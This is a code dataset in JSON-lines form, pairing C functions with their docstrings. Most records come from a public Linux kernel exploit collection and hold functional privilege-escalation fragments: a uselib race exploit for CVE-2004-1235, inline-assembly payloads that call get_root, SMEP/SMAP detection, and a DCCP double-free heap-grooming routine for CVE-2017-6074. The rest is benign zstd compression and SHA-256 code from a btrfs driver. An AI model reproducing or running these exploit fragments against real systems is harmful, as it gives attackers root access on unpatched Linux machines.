fflush(stdout);\n\t\tsigfailed(0);\n\n\t}\n\tsignal(SIGTERM, SIG_IGN);\n\tkill(0, SIGTERM);\n\texecl(shellname, \"sh\", NULL);\n\tfatal(\"execl\", 0);\n}", "path": "linux-kernel-exploits/2004/CVE-2004-1235/744.c", "commit_date": "2017-06-14 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "// 0 - nothing, 1 - SMEP, 2 - SMAP, 3 - SMEP & SMAP\n", "func_signal": "int smap_smep_enabled()", "code": "{\n\tchar buffer[PROC_CPUINFO_LENGTH];\n\tint length = read_file(\"/proc/cpuinfo\", &buffer[0], PROC_CPUINFO_LENGTH);\n\tif (length == -1) {\n\t\tperror(\"[-] open/read(/proc/cpuinfo)\");\n\t\texit(EXIT_FAILURE);\n\t}\n\tint rv = 0;\n\tchar* found = memmem(&buffer[0], length, \"smep\", 4);\n\tif (found != NULL)\n\t\trv += 1;\n\tfound = memmem(&buffer[0], length, \"smap\", 4);\n\tif (found != NULL)\n\t\trv += 2;\n\treturn rv;\n}", "path": "linux-kernel-exploits/2017/CVE-2017-1000112/poc.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "// Unfortunately GCC does not support `__atribute__((naked))` on x86, which\n// can be used to omit a function's prologue, so I had to use this weird\n// wrapper hack as a workaround. Note: Clang does support it, which means it\n// has better support of GCC attributes than GCC itself. Funny.\n", "func_signal": "void wrapper()", "code": "{\n\tasm volatile (\"\t\t\t\t\t\\n\\\n\tpayload:\t\t\t\t\t\\n\\\n\t\tmovq %%rbp, %%rax\t\t\t\\n\\\n\t\tmovq $0xffffffff00000000, %%rdx\t\t\\n\\\n\t\tandq %%rdx, %%rax\t\t\t\\n\\\n\t\tmovq %0, %%rdx\t\t\t\t\\n\\\n\t\taddq %%rdx, %%rax\t\t\t\\n\\\n\t\tmovq %%rax, %%rsp\t\t\t\\n\\\n\t\tcall get_root\t\t\t\t\\n\\\n\t\tret\t\t\t\t\t\\n\\\n\t\" : : \"m\"(saved_esp) : );\n}", "path": "linux-kernel-exploits/2017/CVE-2017-1000112/poc.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "// Sending control messages.\n", "func_signal": "int socket_open(int port)", "code": "{\n  int sock;\n  struct sockaddr_in sa;\n\n  sock = socket(AF_INET, SOCK_DGRAM, 0);\n  if (sock == -1) {\n    perror(\"[-] socket()\");\n    exit(EXIT_FAILURE);\n  }\n\n  sa.sin_family = AF_INET;\n  sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n  sa.sin_port = htons(port);\n  if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) == -1) {\n    perror(\"[-] connect()\");\n    exit(EXIT_FAILURE);\n  }\n\n  return sock;\n}", "path": "linux-kernel-exploits/2016/CVE-2016-2384/poc.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "//\tgive -s for forced stop, -b to clean SLAB\n", "func_signal": "int main(int ac, char **av)", "code": "{\nint r;\n\n\twhile(ac) {\n\t\tr = getopt(ac, av, \"n:l:a:w:c:d:fsh\");\n\t\tif(r<0) break;\n\n\t\tswitch(r) {\n\n\t\tcase 'f' :\n\t\t\tfstop = 1;\n\t\t\tbreak;\n\n\t\tcase 's' :\n\t\t\tsilent = 1;\n\t\t\tbreak;\n\n\t\tcase 'n' :\n\t\t\tsmp_max = atoi(optarg);\n\t\t\tbreak;\n\n\t\tcase 'd':\n\t\t\tif(1!=sscanf(optarg, \"%u\", &delta_max) || delta_max > 100000u )\n\t\t\t\tfatal(\"bad delta value\", 0);\n\t\t\tbreak;\n\n\t\tcase 'w' :\n\t\t\twtime = atoi(optarg);\n\t\t\tif(wtime<0) fatal(\"bad wait value\", 0);\n\t\t\tbreak;\n\n\t\tcase 'l' :\n\t\t\tlibname = strdup(optarg);\n\t\t\tbreak;\n\n\t\tcase 'c' :\n\t\t\tshellname = strdup(optarg);\n\t\t\tbreak;\n\n\t\tcase 'a' :\n\t\t\tif(1!=sscanf(optarg, \"%x\", &map_base))\n\t\t\t\tfatal(\"bad addr value\", 0);\n\t\t\tmap_base &= ~(PGD_SIZE-1);\n\t\t\tbreak;\n\n\t\tcase 'h' :\n\t\tdefault:\n\t\t\tusage(av[0]);\n\t\t\tbreak;\n\t\t}\n\t}\n\n//\tbasic setup\n\tuid = getuid();\n\tsetpgrp();\n\twipe_slab();\n\tprepare();\n\nreturn 0;\n}", "path": "linux-kernel-exploits/2004/CVE-2004-1235/744.c", "commit_date": "2017-06-14 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "//\tsig handlers\n", "func_signal": "void segvcnt(int v)", "code": "{\n\tscnt++;\n\tscan_mm_finish();\n}", "path": "linux-kernel-exploits/2004/CVE-2004-1235/744.c", "commit_date": "2017-06-14 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "// Unfortunately GCC does not support `__atribute__((naked))` on x86, which\n// can be used to omit a function's prologue, so I had to use this weird\n// wrapper hack as a workaround. Note: Clang does support it, which means it\n// has better support of GCC attributes than GCC itself. Funny.\n", "func_signal": "void wrapper()", "code": "{\n  asm volatile (\"                         \\n\\\n    payload:                              \\n\\\n      movq %%rbp, %%rax                   \\n\\\n      movq $0xffffffff00000000, %%rdx     \\n\\\n      andq %%rdx, %%rax                   \\n\\\n      movq %0, %%rdx                      \\n\\\n      addq %%rdx, %%rax                   \\n\\\n      movq %%rax, %%rsp                   \\n\\\n      jmp get_root                        \\n\\\n  \" : : \"m\"(saved_eax) : );\n}", "path": "linux-kernel-exploits/2016/CVE-2016-2384/poc.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "//\treturn number of available SLAB objects in cache\n", "func_signal": "int get_slab_objs(const char *sn)", "code": "{\nstatic int c, d, u = 0, a = 0;\nFILE *fp=NULL;\n\n\tfp = fopen(\"/proc/slabinfo\", \"r\");\n\tif(!fp)\n\t\tfatal(\"get_slab_objs: fopen\", 0);\n\tfgets(name, sizeof(name) - 1, fp);\n\tdo {\n\t\tc = u = a = -1;\n\t\tif (!fgets(line, sizeof(line) - 1, fp))\n\t\t\tbreak;\n\t\tc = sscanf(line, \"%s %u %u %u %u %u %u\", name, &u, &a,\n\t\t\t   &d, &d, &d, &d);\n\t} while (strcmp(name, sn));\n\tclose(fileno(fp));\n\tfclose(fp);\n\treturn c == 7 ? a - u : -1;\n}", "path": "linux-kernel-exploits/2004/CVE-2004-1235/744.c", "commit_date": "2017-06-14 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "// Executes func(arg) from interrupt context multiple times.\n", "func_signal": "void kernel_exec_irq(void *func, unsigned long arg)", "code": "{\n\tint i;\n\tstruct dccp_handle dh;\n\tstruct udp_fifo_handle uh1, uh2, uh3, uh4;\n\tchar dummy[2048];\n\tchar buffer[2048];\n\n\tprintf(\"[.] scheduling %p(%p)\\n\", func, (void *)arg);\n\n\tmemset(&dummy[0], 0xc3, 2048);\n\tinit_timer_buffer(&buffer[0], func, arg);\n\n\tudp_fifo_init(&uh1);\n\tudp_fifo_init(&uh2);\n\tudp_fifo_init(&uh3);\n\tudp_fifo_init(&uh4);\n\n\tdebug(\"kmalloc pad\");\n\tkmalloc_pad();\n\n\tdebug(\"kmalloc warm\");\n\tkmalloc_warm();\n\n\tdebug(\"dccp init\");\n\tdccp_init(&dh, port++);\n\n\tdebug(\"dccp kmalloc kfree\");\n\tdccp_kmalloc_kfree(&dh);\n\n\tdebug(\"catch 1\");\n\tfor (i = 0; i < CATCH_FIRST; i++)\n\t\tudp_fifo_kmalloc(&uh1, &dummy[0]);\n\n\tdebug(\"dccp kfree again\");\n\tdccp_kfree_again(&dh);\n\n\tdebug(\"catch 2\");\n\tfor (i = 0; i < CATCH_FIRST; i++)\n\t\tudp_fifo_kmalloc(&uh2, &dummy[0]);\n\n\tint timers[CATCH_FIRST];\n\tdebug(\"catch 1 -> timer\");\n\tfor (i = 0; i < CATCH_FIRST; i++) {\n\t\tudp_fifo_kfree(&uh1);\n\t\ttimers[i] = timer_kmalloc();\n\t}\n\n\tdebug(\"catch 1 small\");\n\tfor (i = 0; i < CATCH_AGAIN_SMALL; i++)\n\t\tudp_fifo_kmalloc_small(&uh4);\n\n\tdebug(\"schedule timers\");\n\tfor (i = 0; i < CATCH_FIRST; i++)\n\t\ttimer_schedule(timers[i], 500);\n\n\tdebug(\"catch 2 -> overwrite timers\");\n\tfor (i = 0; i < CATCH_FIRST; i++) {\n\t\tudp_fifo_kfree(&uh2);\n\t\tudp_fifo_kmalloc(&uh3, &buffer[0]);\n\t}\n\n\tdebug(\"catch 2 small\");\n\tfor (i = 0; i < CATCH_AGAIN_SMALL; i++)\n\t\tudp_fifo_kmalloc_small(&uh4);\n\n\tprintf(\"[.] waiting for the timer to execute\\n\");\n\n\tdebug(\"wait\");\n\tsleep(1);\n\n\tprintf(\"[.] done\\n\");\n}", "path": "linux-kernel-exploits/2017/CVE-2017-6074/poc.c", "commit_date": "2017-07-31 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "//\tmove stack down #1\n", "func_signal": "void prepare()", "code": "{\nunsigned p=0;\n\n\tenviron = myenv;\n\n\tp = sys_mmap2( 0, STACK_SIZE, PROT_READ|PROT_WRITE,\n\t\t       MAP_PRIVATE|MAP_ANONYMOUS, 0, 0\t);\n\tif(-1==p) fatal(\"mmap2 stack\", 0);\n\tp += STACK_SIZE - 64;\n\n\t__asm__(\"movl\t%%esp, %0\t\\n\"\n\t\t\"movl \t%1, %%esp\t\\n\"\n\t\t: : \"m\"(old_esp), \"m\"(p)\n\t);\n\n\tprepare_finish();\n}", "path": "linux-kernel-exploits/2004/CVE-2004-1235/744.c", "commit_date": "2017-06-14 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "//\tmove stack down #2\n", "func_signal": "void prepare_finish()", "code": "{\nint r;\nstatic struct sysinfo si;\n\n\told_esp &= ~(PAGE_SIZE-1);\n\told_esp -= PAGE_SIZE;\n\ttask_size = ((unsigned)old_esp + 1 GB ) / (1 GB) * 1 GB;\n\tr = sys_munmap(old_esp, task_size-old_esp);\n\tif(r) fatal(\"unmap stack\", 0);\n\n//\tsetup rt env\n\tuid = getuid();\n\tlib_addr = task_size - LIB_SIZE - PAGE_SIZE;\n\tif(map_base)\n\t\tmap_addr = map_base;\n\telse\n\t\tmap_base = map_addr = (lib_addr - PGD_SIZE) & ~(PGD_SIZE-1);\n\tprintf(\"\\n[+] moved stack %x, task_size=0x%.8x, map_base=0x%.8x\",\n\t\told_esp, task_size, map_base); fflush(stdout);\n\n//\tcheck physical mem & prepare\n\tsysinfo(&si);\n\taddr_min = task_size + si.totalram;\n\taddr_min = (addr_min + PGD_SIZE - 1) & ~(PGD_SIZE-1);\n\taddr_max = addr_min + si.totalram;\n\tif((unsigned)addr_max >= 0xffffe000 || (unsigned)addr_max < (unsigned)addr_min)\n\t\taddr_max = 0xffffd000;\n\n\tprintf(\"\\n[+] vmalloc area 0x%.8x - 0x%.8x\", addr_min, addr_max);\n\tmax_page = (addr_max - addr_min) / PAGE_SIZE;\n\tpagemap = malloc( max_page + 32 );\n\tif(!pagemap) fatal(\"malloc pagemap\", 1);\n\tmemset(pagemap, 0, max_page + 32);\n\n//\tgo go\n\tmake_lib();\n\texploitme();\n}", "path": "linux-kernel-exploits/2004/CVE-2004-1235/744.c", "commit_date": "2017-06-14 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "//\tchild reap\n", "func_signal": "void reaper(int v)", "code": "{\n\tccnt++;\n\twaitpid(0, &v, WNOHANG|WUNTRACED);\n}", "path": "linux-kernel-exploits/2004/CVE-2004-1235/744.c", "commit_date": "2017-06-14 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "//\tuse elf library and try to sleep on kmalloc\n", "func_signal": "void exploitme()", "code": "{\nint r, sz, pcnt=0;\nstatic char smiley[]=\"-\\\\|/-\\\\|/\";\n\n//\tprintf(\"\\n    cat /proc/%d/maps\", getpid() ); fflush(stdout);\n\n//\thelper clone\n\tfinish=0; ccnt=0;\n\tsz = sizeof(cstack) / sizeof(cstack[0]);\n\tcpid = clone(&raceme, (void*) &cstack[sz-16],\n\t\t\tCLONE_VM|CLONE_SIGHAND|CLONE_FS|SIGCHLD, NULL );\n\tif(-1==cpid) fatal(\"clone\", 0);\n\n//\tsynchronize threads\n\twhile(!finish) sys_sched_yield();\n\tfinish=0;\n\tif(!silent) {\n\t\tprintf(\"\\n\"); fflush(stdout);\n\t}\n\n//\ttry to hit the kmalloc race\n\tfor(;;) {\n\n\t\tr = get_slab_objs(\"vm_area_struct\");\n\t\twhile(r != 1) {\n\t\t\tprepare_slab();\n\t\t\tr--;\n\t\t}\n\n\t\tsys_gettimeofday(&tm1, NULL);\n\t\tgo = 1;\n\t\tr=sys_uselib(libname);\n\t\tgo = 0;\n\t\tif(r) fatal(\"uselib\", 0);\n\t\tif(finish) break;\n\n//\twipe lib VMAs and try again\n\t\tr = sys_munmap(lib_addr, LIB_SIZE);\n\t\tif(r) fatal(\"munmap lib\", 0);\n\t\tif(ccnt) goto failed;\n\n\t\tif( !silent && !(pcnt%64) ) {\n\t\t\tprintf(\"\\r    Wait... %c\", smiley[ (pcnt/64)%8 ]);\n\t\t\tfflush(stdout);\n\t\t}\n\t\tpcnt++;\n\t}\n\n//\tseems we raced, free mem\n\tr = sys_munmap(map_addr, map_base-map_addr + PAGE_SIZE);\n\tif(r) fatal(\"munmap 1\", 0);\n\tr = sys_munmap(lib_addr, PAGE_SIZE);\n\tif(r) fatal(\"munmap 2\", 0);\n\n//\trelax kswapd\n\tsys_gettimeofday(&tm1, NULL);\n\tfor(;;) {\n\t\tsys_sched_yield();\n\t\tsys_gettimeofday(&tm2, NULL);\n\t\tdelta = tmdiff(&tm1, &tm2);\n\t\tif( wtime*1000000U <= (unsigned)delta ) break;\n\t}\n\n//\twe need to check the PROT_EXEC flag\n\tmap_flags = PROT_EXEC;\n\tcheck_vma_flags();\n\tif(!map_flags) {\n\t\tprintf(\"\\n    VMAs reversed\"); fflush(stdout);\n\t}\n\n//\twrite protect brk's VMA to fool vm_enough_memory()\n\tr = sys_mprotect((lib_addr + PAGE_SIZE), LIB_SIZE-PAGE_SIZE,\n\t\t\t PROT_READ|map_flags);\n\tif(-1==r) { fatal(\"mprotect brk\", 0); }\n\n//\tthis will finally make the big VMA...\n\tsz = (0-lib_addr) - LIB_SIZE - PAGE_SIZE;\nexpand:\n\tr = sys_madvise((void*)(lib_addr + PAGE_SIZE),\n\t\t\tLIB_SIZE-PAGE_SIZE, MADV_NORMAL);\n\tif(r) fatal(\"madvise\", 0);\n\tr = sys_mremap(lib_addr + LIB_SIZE-PAGE_SIZE,\n\t\t\tPAGE_SIZE, sz, MREMAP_MAYMOVE, 0);\n\tif(-1==r) {\n\t\tif(0==sz) {\n\t\t\tfatal(\"mremap: expand VMA\", 0);\n\t\t} else {\n\t\t\tsz -= PAGE_SIZE;\n\t\t\tgoto expand;\n\t\t}\n\t}\n\tvma_start = lib_addr + PAGE_SIZE;\n\tvma_end = vma_start + sz + 2*PAGE_SIZE;\n\tprintf(\"\\n    expanded VMA (0x%.8x-0x%.8x)\", vma_start, vma_end);\n\tfflush(stdout);\n\n//\ttry to figure kernel layout\n\tsignal(SIGCHLD, reaper);\n\tsignal(SIGSEGV, segvcnt);\n\tsignal(SIGBUS, segvcnt);\n\tscan_mm_start();\n\nfailed:\n\tfatal(\"try again\", 0);\n\n}", "path": "linux-kernel-exploits/2004/CVE-2004-1235/744.c", "commit_date": "2017-06-14 00:00:00", "repo_name": "SecWiki/linux-kernel-exploits", "stars": 5061, "license": "mit", "language": "c", "size": 9163}
{"docstring": "/** ZSTD_buildSuperBlockEntropy() :\n *  Builds entropy for the super-block.\n *  @return : 0 on success or error code */\n", "func_signal": "static size_t\nZSTD_buildSuperBlockEntropy(seqStore_t* seqStorePtr,\n                      const ZSTD_entropyCTables_t* prevEntropy,\n                            ZSTD_entropyCTables_t* nextEntropy,\n                      const ZSTD_CCtx_params* cctxParams,\n                            ZSTD_entropyCTablesMetadata_t* entropyMetadata,\n                            void* workspace, size_t wkspSize)", "code": "{\n    size_t const litSize = seqStorePtr->lit - seqStorePtr->litStart;\n    DEBUGLOG(5, \"ZSTD_buildSuperBlockEntropy\");\n    entropyMetadata->hufMetadata.hufDesSize =\n        ZSTD_buildSuperBlockEntropy_literal(seqStorePtr->litStart, litSize,\n                                            &prevEntropy->huf, &nextEntropy->huf,\n                                            &entropyMetadata->hufMetadata,\n                                            ZSTD_disableLiteralsCompression(cctxParams),\n                                            workspace, wkspSize);\n    FORWARD_IF_ERROR(entropyMetadata->hufMetadata.hufDesSize, \"ZSTD_buildSuperBlockEntropy_literal failed\");\n    entropyMetadata->fseMetadata.fseTablesSize =\n        ZSTD_buildSuperBlockEntropy_sequences(seqStorePtr,\n                                              &prevEntropy->fse, &nextEntropy->fse,\n                                              cctxParams,\n                                              &entropyMetadata->fseMetadata,\n                                              workspace, wkspSize);\n    FORWARD_IF_ERROR(entropyMetadata->fseMetadata.fseTablesSize, \"ZSTD_buildSuperBlockEntropy_sequences failed\");\n    return 0;\n}", "path": "btrfs/src/zstd/zstd_compress_superblock.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/* ZSTD_execSequenceEnd():\n * This version handles cases that are near the end of the output buffer. It requires\n * more careful checks to make sure there is no overflow. By separating out these hard\n * and unlikely cases, we can speed up the common cases.\n *\n * NOTE: This function needs to be fast for a single long sequence, but doesn't need\n * to be optimized for many small sequences, since those fall into ZSTD_execSequence().\n */\n", "func_signal": "FORCE_NOINLINE\nsize_t ZSTD_execSequenceEnd(BYTE* op,\n                            BYTE* const oend, seq_t sequence,\n                            const BYTE** litPtr, const BYTE* const litLimit,\n                            const BYTE* const prefixStart, const BYTE* const virtualStart, const BYTE* const dictEnd)", "code": "{\n    BYTE* const oLitEnd = op + sequence.litLength;\n    size_t const sequenceLength = sequence.litLength + sequence.matchLength;\n    const BYTE* const iLitEnd = *litPtr + sequence.litLength;\n    const BYTE* match = oLitEnd - sequence.offset;\n    BYTE* const oend_w = oend - WILDCOPY_OVERLENGTH;\n\n    /* bounds checks : careful of address space overflow in 32-bit mode */\n    RETURN_ERROR_IF(sequenceLength > (size_t)(oend - op), dstSize_tooSmall, \"last match must fit within dstBuffer\");\n    RETURN_ERROR_IF(sequence.litLength > (size_t)(litLimit - *litPtr), corruption_detected, \"try to read beyond literal buffer\");\n    assert(op < op + sequenceLength);\n    assert(oLitEnd < op + sequenceLength);\n\n    /* copy literals */\n    ZSTD_safecopy(op, oend_w, *litPtr, sequence.litLength, ZSTD_no_overlap);\n    op = oLitEnd;\n    *litPtr = iLitEnd;\n\n    /* copy Match */\n    if (sequence.offset > (size_t)(oLitEnd - prefixStart)) {\n        /* offset beyond prefix */\n        RETURN_ERROR_IF(sequence.offset > (size_t)(oLitEnd - virtualStart), corruption_detected, \"\");\n        match = dictEnd - (prefixStart-match);\n        if (match + sequence.matchLength <= dictEnd) {\n            memmove(oLitEnd, match, sequence.matchLength);\n            return sequenceLength;\n        }\n        /* span extDict & currentPrefixSegment */\n        {   size_t const length1 = dictEnd - match;\n            memmove(oLitEnd, match, length1);\n            op = oLitEnd + length1;\n            sequence.matchLength -= length1;\n            match = prefixStart;\n    }   }\n    ZSTD_safecopy(op, oend_w, match, sequence.matchLength, ZSTD_overlap_src_before_dst);\n    return sequenceLength;\n}", "path": "btrfs/src/zstd/zstd_decompress_block.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/*\n * Limitations:\n * - Since input is a pointer in RAM, the data to hash should be in RAM, which could be a problem\n *   for large data sizes.\n * - SHA algorithms theoretically operate on bit strings. However, this implementation has no support\n *   for bit string lengths that are not multiples of eight, and it really operates on arrays of bytes.\n *   In particular, the len parameter is a number of bytes.\n */\n", "func_signal": "void calc_sha256(uint8_t* hash, const void* input, size_t len)", "code": "{\n\t/*\n\t * Note 1: All integers (expect indexes) are 32-bit unsigned integers and addition is calculated modulo 2^32.\n\t * Note 2: For each round, there is one round constant k[i] and one entry in the message schedule array w[i], 0 = i = 63\n\t * Note 3: The compression function uses 8 working variables, a through h\n\t * Note 4: Big-endian convention is used when expressing the constants in this pseudocode,\n\t *     and when parsing message block data from bytes to words, for example,\n\t *     the first word of the input message \"abc\" after padding is 0x61626380\n\t */\n\n\t/*\n\t * Initialize hash values:\n\t * (first 32 bits of the fractional parts of the square roots of the first 8 primes 2..19):\n\t */\n\tuint32_t h[] = { 0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19 };\n\tunsigned i, j;\n\n\t/* 512-bit chunks is what we will operate on. */\n\tuint8_t chunk[64];\n\n\tstruct buffer_state state;\n\n\tinit_buf_state(&state, input, len);\n\n\twhile (calc_chunk(chunk, &state)) {\n\t\tuint32_t ah[8];\n\n\t\tconst uint8_t *p = chunk;\n\n\t\t/* Initialize working variables to current hash value: */\n\t\tfor (i = 0; i < 8; i++)\n\t\t\tah[i] = h[i];\n\n\t\t/* Compression function main loop: */\n\t\tfor (i = 0; i < 4; i++) {\n\t\t\t/*\n\t\t\t * The w-array is really w[64], but since we only need\n\t\t\t * 16 of them at a time, we save stack by calculating\n\t\t\t * 16 at a time.\n\t\t\t *\n\t\t\t * This optimization was not there initially and the\n\t\t\t * rest of the comments about w[64] are kept in their\n\t\t\t * initial state.\n\t\t\t */\n\n\t\t\t/*\n\t\t\t * create a 64-entry message schedule array w[0..63] of 32-bit words\n\t\t\t * (The initial values in w[0..63] don't matter, so many implementations zero them here)\n\t\t\t * copy chunk into first 16 words w[0..15] of the message schedule array\n\t\t\t */\n\t\t\tuint32_t w[16];\n\n\t\t\tfor (j = 0; j < 16; j++) {\n\t\t\t\tif (i == 0) {\n\t\t\t\t\tw[j] = (uint32_t) p[0] << 24 | (uint32_t) p[1] << 16 |\n\t\t\t\t\t\t(uint32_t) p[2] << 8 | (uint32_t) p[3];\n\t\t\t\t\tp += 4;\n\t\t\t\t} else {\n\t\t\t\t\t/* Extend the first 16 words into the remaining 48 words w[16..63] of the message schedule array: */\n\t\t\t\t\tconst uint32_t s0 = right_rot(w[(j + 1) & 0xf], 7) ^ right_rot(w[(j + 1) & 0xf], 18) ^ (w[(j + 1) & 0xf] >> 3);\n\t\t\t\t\tconst uint32_t s1 = right_rot(w[(j + 14) & 0xf], 17) ^ right_rot(w[(j + 14) & 0xf], 19) ^ (w[(j + 14) & 0xf] >> 10);\n\t\t\t\t\tw[j] = w[j] + s0 + w[(j + 9) & 0xf] + s1;\n\t\t\t\t}\n\t\t\t\tconst uint32_t s1 = right_rot(ah[4], 6) ^ right_rot(ah[4], 11) ^ right_rot(ah[4], 25);\n\t\t\t\tconst uint32_t ch = (ah[4] & ah[5]) ^ (~ah[4] & ah[6]);\n\t\t\t\tconst uint32_t temp1 = ah[7] + s1 + ch + k[i << 4 | j] + w[j];\n\t\t\t\tconst uint32_t s0 = right_rot(ah[0], 2) ^ right_rot(ah[0], 13) ^ right_rot(ah[0], 22);\n\t\t\t\tconst uint32_t maj = (ah[0] & ah[1]) ^ (ah[0] & ah[2]) ^ (ah[1] & ah[2]);\n\t\t\t\tconst uint32_t temp2 = s0 + maj;\n\n\t\t\t\tah[7] = ah[6];\n\t\t\t\tah[6] = ah[5];\n\t\t\t\tah[5] = ah[4];\n\t\t\t\tah[4] = ah[3] + temp1;\n\t\t\t\tah[3] = ah[2];\n\t\t\t\tah[2] = ah[1];\n\t\t\t\tah[1] = ah[0];\n\t\t\t\tah[0] = temp1 + temp2;\n\t\t\t}\n\t\t}\n\n\t\t/* Add the compressed chunk to the current hash value: */\n\t\tfor (i = 0; i < 8; i++)\n\t\t\th[i] += ah[i];\n\t}\n\n\t/* Produce the final hash value (big-endian): */\n\tfor (i = 0, j = 0; i < 8; i++)\n\t{\n\t\thash[j++] = (uint8_t) (h[i] >> 24);\n\t\thash[j++] = (uint8_t) (h[i] >> 16);\n\t\thash[j++] = (uint8_t) (h[i] >> 8);\n\t\thash[j++] = (uint8_t) h[i];\n\t}\n}", "path": "btrfs/src/sha256.c", "commit_date": "2020-02-21 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/* Secondary normalization method.\n   To be used when primary method fails. */\n", "func_signal": "static size_t FSE_normalizeM2(short* norm, U32 tableLog, const unsigned* count, size_t total, U32 maxSymbolValue)", "code": "{\n    short const NOT_YET_ASSIGNED = -2;\n    U32 s;\n    U32 distributed = 0;\n    U32 ToDistribute;\n\n    /* Init */\n    U32 const lowThreshold = (U32)(total >> tableLog);\n    U32 lowOne = (U32)((total * 3) >> (tableLog + 1));\n\n    for (s=0; s<=maxSymbolValue; s++) {\n        if (count[s] == 0) {\n            norm[s]=0;\n            continue;\n        }\n        if (count[s] <= lowThreshold) {\n            norm[s] = -1;\n            distributed++;\n            total -= count[s];\n            continue;\n        }\n        if (count[s] <= lowOne) {\n            norm[s] = 1;\n            distributed++;\n            total -= count[s];\n            continue;\n        }\n\n        norm[s]=NOT_YET_ASSIGNED;\n    }\n    ToDistribute = (1 << tableLog) - distributed;\n\n    if (ToDistribute == 0)\n        return 0;\n\n    if ((total / ToDistribute) > lowOne) {\n        /* risk of rounding to zero */\n        lowOne = (U32)((total * 3) / (ToDistribute * 2));\n        for (s=0; s<=maxSymbolValue; s++) {\n            if ((norm[s] == NOT_YET_ASSIGNED) && (count[s] <= lowOne)) {\n                norm[s] = 1;\n                distributed++;\n                total -= count[s];\n                continue;\n        }   }\n        ToDistribute = (1 << tableLog) - distributed;\n    }\n\n    if (distributed == maxSymbolValue+1) {\n        /* all values are pretty poor;\n           probably incompressible data (should have already been detected);\n           find max, then give all remaining points to max */\n        U32 maxV = 0, maxC = 0;\n        for (s=0; s<=maxSymbolValue; s++)\n            if (count[s] > maxC) { maxV=s; maxC=count[s]; }\n        norm[maxV] += (short)ToDistribute;\n        return 0;\n    }\n\n    if (total == 0) {\n        /* all of the symbols were low enough for the lowOne or lowThreshold */\n        for (s=0; ToDistribute > 0; s = (s+1)%(maxSymbolValue+1))\n            if (norm[s] > 0) { ToDistribute--; norm[s]++; }\n        return 0;\n    }\n\n    {   U64 const vStepLog = 62 - tableLog;\n        U64 const mid = (1ULL << (vStepLog-1)) - 1;\n        U64 const rStep = ((((U64)1<<vStepLog) * ToDistribute) + mid) / total;   /* scale on remaining */\n        U64 tmpTotal = mid;\n        for (s=0; s<=maxSymbolValue; s++) {\n            if (norm[s]==NOT_YET_ASSIGNED) {\n                U64 const end = tmpTotal + (count[s] * rStep);\n                U32 const sStart = (U32)(tmpTotal >> vStepLog);\n                U32 const sEnd = (U32)(end >> vStepLog);\n                U32 const weight = sEnd - sStart;\n                if (weight < 1)\n                    return ERROR(GENERIC);\n                norm[s] = (short)weight;\n                tmpTotal = end;\n    }   }   }\n\n    return 0;\n}", "path": "btrfs/src/zstd/fse_compress.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
{"docstring": "/*-****************************************\n*  Version\n******************************************/\n", "func_signal": "unsigned ZSTD_versionNumber(void)", "code": "{ return ZSTD_VERSION_NUMBER; }\n\nconst char* ZSTD_versionString(void) { return ZSTD_VERSION_STRING; }\n\n\n/*-****************************************\n*  ZSTD Error Management\n******************************************/\n#undef ZSTD_isError   /* defined within zstd_internal.h */\n/*! ZSTD_isError() :\n *  tells if a return value is an error code\n *  symbol is required for external callers */\nunsigned ZSTD_isError(size_t code) { return ERR_isError(code); }\n\n/*! ZSTD_getErrorName() :\n *  provides error code string from function result (useful for debugging) */\nconst char* ZSTD_getErrorName(size_t code) { return ERR_getErrorName(code); }\n\n/*! ZSTD_getError() :\n *  convert a `size_t` function result into a proper ZSTD_errorCode enum */\nZSTD_ErrorCode ZSTD_getErrorCode(size_t code) { return ERR_getErrorCode(code); }\n\n/*! ZSTD_getErrorString() :\n *  provides error code string from enum */\nconst char* ZSTD_getErrorString(ZSTD_ErrorCode code) { return ERR_getErrorString(code); }\n\n\n\n/*=**************************************************************\n*  Custom allocator\n****************************************************************/\nvoid* ZSTD_malloc(size_t size, ZSTD_customMem customMem)\n{\n    return customMem.customAlloc(customMem.opaque, size);\n}", "path": "btrfs/src/zstd/zstd_common.c", "commit_date": "2020-08-08 00:00:00", "repo_name": "maharmstone/btrfs", "stars": 4838, "license": "lgpl-3.0", "language": "c", "size": 61836}
